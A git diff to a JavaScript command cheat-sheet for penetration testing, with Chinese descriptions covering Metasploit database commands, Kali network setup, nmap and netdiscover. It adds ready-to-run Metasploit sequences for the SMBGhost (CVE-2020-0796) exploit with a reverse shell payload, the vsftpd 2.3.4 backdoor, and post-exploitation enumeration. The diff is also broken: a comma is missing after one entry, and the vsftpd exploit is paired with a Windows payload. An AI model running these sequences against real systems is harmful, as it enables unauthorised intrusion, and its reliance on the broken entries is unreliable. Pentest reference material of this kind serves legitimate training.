@@ -30,14 +30,23 @@
         //收藏的网站
       { command: 'https://mogua.co/', description: '“摸瓜，取自顺藤摸瓜，比喻沿着发现的线索追究根底。”可疑APP查验网站'},
       { command: 'https://www.yuque.com/again-719bb/pfhi8f/gbe4ms53sp3m1mpt', description: '“小T的文章学习'},
-      
-
+      { command: 'https://cybermap.kaspersky.com/cn', description: '“卡巴斯基实时网络威胁地图'},      
+      { command: 'https://ssa.yundun.com/cc', description: '“云盾实时网络威胁地图'},
 
 
       //metasploit下的命令
       { command: 'msfdb reinit', description: '“重置数据库-metasploit'},
+      { command: 'msfdb run', description: '“启动metasploit-metasploit'},
+      { command: 'banner', description: '“显示炫酷的Metasploit横幅-metasploit'},
+      { command: 'cd', description: '“改变当前工作目录(提示：命令在sbin目录下)-metasploit'},
+      { command: 'color true', description: '“切换颜色模式-metasploit'},
+      { command: 'connect baidu.com 443', description: '“使用connect命令对百度连接-metasploit'},  
+      { command: 'exit', description: '“退出控制台（和quit一个意思）-metasploit'}, 
+      { command: 'chcp 6500', description: '“修改编码方便更好的显示-metasploit'}, 
+
+
       { command: 'hosts', description: '“展示数据库中的历史信息-metasploit'},
-      { command: 'hosts -h', description: '“展示hosts的帮助信息-metasploit'},
+      { command: 'hosts -h', description: '“展示hosts的帮助信息（‘？’也行）-metasploit'},
       { command: 'hosts -d', description: '“删除数据库中对应的主机的信息-metasploit'},
       { command: 'hosts -a ', description: '添加一个或多个主机地址到当前工作空间。-metasploit'},
       { command: 'hosts -c ', description: '仅显示指定列（请参考下面列出的列名）。-metasploit'},
@@ -67,9 +76,40 @@
       { command: 'services -S ', description: ' --search <filter>：用于过滤的搜索字符串。-metasploit'},
       { command: 'services -u ', description: ' --up：仅显示处于活动状态（up）的服务。-metasploit'},
       { command: 'services -U ', description: ' --update：更新现有服务的数据。-metasploit'},
-      { command: 'msf6 > help  ', description: ' 查看msf6的帮助信息 。-metasploit'},
-       { command: 'searchsploit -u', description: '  更新数据库中的漏洞利用信息 。-metasploit'},    
+      { command: 'help  ', description: ' 查看msf6的帮助信息 。-metasploit'},
+      { command: 'searchsploit -u', description: '  更新数据库中的漏洞利用信息 。-metasploit'},    
+      { command: 'notes -d #IP#', description: '删除备注，而不是进行搜索操作。-metasploit'},  
+      { command: 'notes -a -t mynotes -n \'formynlg\' #IP#', description: '添加一条自定义的注释信息。-metasploit'}, 
+      { command: 'notes -h', description: '显示此帮助信息。-metasploit'},                       
+      { command: 'notes -R', description: '从搜索结果中设置RHOSTS。-metasploit'},     
+      { command: 'notes -o result.csv', description: '将备注保存到CSV文件中。-metasploit'},   
+      { command: 'vulns -h ', description: '显示vulns帮助信息。-metasploit'},   
+      { command: 'vulns -i ', description: '显示漏洞详细信息。-metasploit'},   
+      { command: 'vulns -o results.csv', description: '将输出结果以CSV格式发送到指定文件。-metasploit'},   
+      { command: 'vulns -p ', description: '列出匹配指定端口的漏洞。-metasploit'},   
+      { command: 'vulns -R ', description: '从搜索结果中设置RHOSTS。-metasploit'},   
+      { command: 'vulns -S ', description: '根据提供的搜索字符串进行过滤。-metasploit'},   
+      { command: 'vulns -s ', description: '列出匹配指定服务名称的漏洞。-metasploit'},   
+      { command: 'workspace -a new_workspace', description: '添加一个工作区。-metasploit'},   
+      { command: 'workspace -d old_workspace', description: '删除指定的工作区。-metasploit'},   
+      { command: 'workspace -D ', description: '删除所有工作区。-metasploit'},   
+      { command: 'workspace -h ', description: '显示帮助信息。-metasploit'},   
+      { command: 'workspace -l ', description: '列出所有工作区。-metasploit'},   
+      { command: 'workspace -r new_name', description: '<新名称> 重命名一个工作区。-metasploit'},   
+      { command: 'workspace -S name', description: '搜索指定名称的工作区。-metasploit'},   
+      { command: 'workspace -v ', description: '详细列出所有工作区。-metasploit'},   
+      { command: 'creds -P admin', description: '--password <文本>: 列出包含指定文本的密码'},
+      { command: 'creds -p 1-65500', description: '--port <端口范围>: 列出登录服务在指定端口范围内的凭证'},
+      { command: 'creds -s mysql', description: '<服务名称>: 列出与指定服务名称匹配的凭证（多个服务名称用逗号分隔）'},
+      { command: 'creds -u root', description: '--user <文本>: 列出用户名包含指定文本的凭证'},
+      { command: 'creds -t password', description: '--type <类型>: 列出指定类型的凭证，如：password、ntlm、hash 或 支持的JtR格式'},
+      { command: 'creds -O #IP#', description: '--origins <IP>: 列出来源匹配指定IP地址的凭证'},
+      { command: 'creds -r ', description: '--realm <范围>: 列出范围匹配指定值的凭证'},
+      { command: 'creds -R #IP#', description: '--rhosts: 根据搜索结果设置RHOSTS'},
+      { command: 'creds -v ', description: '--verbose: 不对长密码哈希进行截断'},
 
+
+      
       //网络发现命令
       { command: 'netdiscover -i eth0 -r 192.168.1.0/24', description: '“主动网络发现-netdiscover'},
       { command: 'netdiscover -p', description: '“被动网络发现-netdiscover'},
@@ -117,7 +157,35 @@
       { command: 'nmap -sV -p- -Pn -O #IP# -oX eg.xml', description: '将目标的端口以及版本以及服务信息导出到一个eg.xml文件中供metasploit数据库使用'},
       
       //ssh命令
-      { command: 'ssh root@#IP#', description: '通过SSH连接到目标IP' }
+      { command: 'ssh root@#IP#', description: '通过SSH连接到目标IP' },
+
+      //kali修改ip
+      { command: 'vim /etc/network/interfaces', description: 'kali凯丽修改IP配置' },
+      { command: 'systemctl stop NetworkManager', description: 'kali凯丽IP修改后停止网络管理服务' },
+      { command: 'systemctl restart networking', description: 'kali凯丽IP修改后重启网卡' },
+      { command: 'systemctl start NetworkManager', description: 'kali凯丽IP修改后启动网络管理服务' },
+      //kali修改代理配置
+      { command: 'vim /etc/proxychains4.conf', description: 'kali凯丽修改代理配置' },
+    
+
+      //window10-1903渗透测试  
+      { command: 'unzip external.zip -d /usr/share/metasploit-framework/', description: '利用前补充下漏洞库的文件（自行找到）-window10-1903渗透测试' },
+      { command: 'use exploit/windows/smb/cve_2020_0796_smbghost', description: '设置漏洞利用模块-window10-1903渗透测试' },
+      { command: 'set payload windows/x64/shell/reverse_tcp', description: '设置攻击载荷模块-window10-1903渗透测试' },
+      { command: 'set DefangedMode false', description: '设置配置完成后开始执行-window10-1903渗透测试' },
+      { command: 'set RHOSTS #IP#', description: '设置攻击模块-window10-1903渗透测试' },
+      { command: 'run', description: '执行渗透-window10-1903渗透测试' },     
+      //vsftpd_234版本漏洞渗透测试
+      { command: 'use exploit/unix/ftp/vsftpd_234_backdoor', description: '设置漏洞利用模块-vsftpd_2.3.4渗透测试' },
+      { command: 'set payload windows/x64/shell/reverse_tcp', description: '设置攻击载荷模块-vsftpd_2.3.4渗透测试' },
+      { command: 'set RHOSTS #IP#', description: '设置攻击模块-vsftpd_2.3.4渗透测试' },
+      { command: 'run', description: '执行渗透-vsftpd_2.3.4渗透测试' } 
+      //系统枚举渗透测试
+      { command: 'use post/linux/gather/enum_system', description: '设置漏洞利用模块-枚举系统渗透测试' },
+      { command: 'set sessions 1', description: '设置会话1-枚举系统渗透测试' },
+      { command: 'run', description: '执行枚举-枚举系统渗透测试' }    
+
+
       // 其他结果...
     ];
 
